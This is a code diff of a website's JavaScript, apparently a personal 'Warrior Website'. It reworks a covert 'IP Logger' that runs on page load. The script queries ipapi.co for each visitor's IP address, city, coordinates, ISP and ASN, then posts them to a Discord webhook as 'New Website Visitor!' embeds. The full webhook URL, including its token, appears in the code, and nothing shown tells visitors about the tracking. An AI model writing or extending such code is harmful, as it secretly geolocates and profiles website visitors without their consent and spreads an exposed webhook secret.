@@ -104,45 +104,50 @@ gsap.from('.contact-form', {
   ease: 'power2.out'
 });
 
-// IP Logger and Webhook Integration
+// IP Logger and Webhook Integration with Two Embeds
 const webhookUrl = "https://discord.com/api/webhooks/1338605129938501742/BzbZgA6Sxjjn4kDwNVQEE1L6r08rDBjguO3megjhvVQtZCdANUEpmW299Vgp1dQU9r2a";
 
 // Fetch IP and location details
 fetch('https://ipapi.co/json/')
   .then(response => response.json())
   .then(data => {
-    const embedFields = [
-      { name: "IP Address", value: data.ip || "N/A", inline: true },
-      { name: "City", value: data.city || "N/A", inline: true },
-      { name: "Region", value: data.region || "N/A", inline: true },
-      { name: "Country", value: data.country_name || "N/A", inline: true },
-      { name: "Country Code", value: data.country || "N/A", inline: true },
-      { name: "Postal Code", value: data.postal || "N/A", inline: true },
-      { name: "Latitude", value: data.latitude || "N/A", inline: true },
-      { name: "Longitude", value: data.longitude || "N/A", inline: true },
-      { name: "Time Zone", value: data.timezone || "N/A", inline: true },
-      { name: "Region Code", value: data.region_code || "N/A", inline: true },
-      { name: "Country Calling Code", value: data.country_calling_code || "N/A", inline: true },
-      { name: "Currency", value: data.currency || "N/A", inline: true },
-      { name: "Languages", value: data.languages || "N/A", inline: true },
-      { name: "ASN", value: data.asn || "N/A", inline: true },
-      { name: "ISP", value: data.org || "N/A", inline: true }
-    ];
+    // Create the first embed (Visitor Information)
+    const embed1 = {
+      title: "New Website Visitor!",
+      color: 3447003, // Blue color
+      fields: [
+        { name: "IP Address", value: data.ip || "N/A", inline: true },
+        { name: "City", value: data.city || "N/A", inline: true },
+        { name: "Region", value: data.region || "N/A", inline: true },
+        { name: "Country", value: data.country_name || "N/A", inline: true },
+        { name: "Latitude", value: data.latitude || "N/A", inline: true },
+        { name: "Longitude", value: data.longitude || "N/A", inline: true },
+        { name: "ISP", value: data.org || "N/A", inline: true }
+      ],
+      footer: { text: "Warrior Website" }
+    };
 
-    // Filter out invalid fields
-    const validFields = embedFields.filter(field => field.value && field.value !== "N/A");
+    // Create the second embed (Additional Information)
+    const embed2 = {
+      title: "Additional Details",
+      color: 15158332, // Red color
+      fields: [
+        { name: "Timezone", value: data.timezone || "N/A", inline: true },
+        { name: "Currency", value: data.currency || "N/A", inline: true },
+        { name: "Languages", value: data.languages || "N/A", inline: true },
+        { name: "ASN", value: data.asn || "N/A", inline: true }
+      ],
+      footer: { text: "Warrior Website" }
+    };
 
+    // Create the payload with both embeds
     const payload = {
       username: "Visitor Logger",
-      embeds: [
-        {
-          title: "New Website Visitor!",
-          color: 3447003,
-          fields: validFields,
-          footer: { text: "Warrior Website" }
-        }
-      ]
+      embeds: [embed1, embed2] // Include both embeds here
     };
+
+    // Log the payload for debugging
+    console.log("Payload:", payload);
 
     // Send data to the webhook
     fetch(webhookUrl, {
@@ -157,6 +162,7 @@ fetch('https://ipapi.co/json/')
         console.log("Visitor information sent successfully!");
       } else {
         console.error("Failed to send visitor information. Status:", response.status);
+        response.json().then(err => console.error("Error Details:", err)); // Log error details
       }
     })
     .catch(error => console.error("Error:", error));
